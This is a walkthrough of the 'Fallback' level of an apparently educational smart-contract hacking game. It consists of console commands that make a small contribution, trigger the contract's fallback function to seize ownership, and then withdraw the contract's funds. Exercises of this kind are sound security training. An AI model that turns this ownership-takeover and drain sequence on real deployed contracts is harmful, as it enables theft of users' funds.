# Fallback

* What are the areas that you can transfer ownership of the contract?
* What are the necessary conditions that need to be met in order for that to happen?


<details>
  <summary>EXPAND FOR SOLUTION</summary>
  <p>
First function that allows ownership is contribute()
    — has to contribute more than the owner.

await contract.owner()

the mapping address is in the top with “contributions”. Pass an address to see the amount.

await contract.contributions("ADDRESSOFOWNER")

Shows a large amount - 10000000 - yikes!

Another way to set the owner is through the callback function.

It requires two things: that we send it some value, and that our contribution is greater than zero. Let’s look at our contributions.

await contract.contributions(player)

Ohs noes - we have zero. So we need to add some contributions.

await contract.contribute({value:1})

Great we have a token. Now let’s send a value to the callback function.

contract.sendTransaction({value:1})

Are we the owner now?

await contract.owner()

Yes!!! Now let’s liquidate!

contract.withdraw()

await getBalance(contract.address)
  </p>
</details>
